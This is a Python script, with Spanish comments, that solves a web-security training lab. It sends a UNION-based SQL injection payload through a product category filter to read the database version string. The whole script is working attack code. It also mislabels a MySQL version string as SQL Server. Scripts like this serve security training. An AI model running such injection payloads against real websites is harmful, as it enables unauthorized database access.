#Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft PRACTITIONER

#This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
#To solve the lab, display the database version string.
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxyjp = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def obtener_version_sqlserver(url):
    ruta = "filter?category=Accessories"
    payload_sqli = "' UNION SELECT @@version,NULL-- -"
    solicitud_get = requests.get(url + ruta + payload_sqli, verify=False, proxies=proxyjp)
    respuesta_del_get = solicitud_get.text
    if "8.0.36-0ubuntu0.20.04.1" in respuesta_del_get:
        print("[+] Se encontro la version de la bd sqlserver")
        parseado = BeautifulSoup(respuesta_del_get, 'html.parser')
        version = parseado.find(string=re.compile('.*0ubuntu0.*'))
        print("[+] La version de sql server es: " + version)
        return True
    return False        

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip() #aqui obtiene la url introducida por pantalla
    except IndexError:
        print("[-] Uso: %s <url>" % sys.argv[0])
        print("[-] Ejemplo: %s <https://paginaequis.com>" % sys.argv[0])
        sys.exit(-1)
    print("[+] Obteniendo la versión de sql server...")
    if not obtener_version_sqlserver(url):
        print("[-] No se pudo obtener la versión de sql server")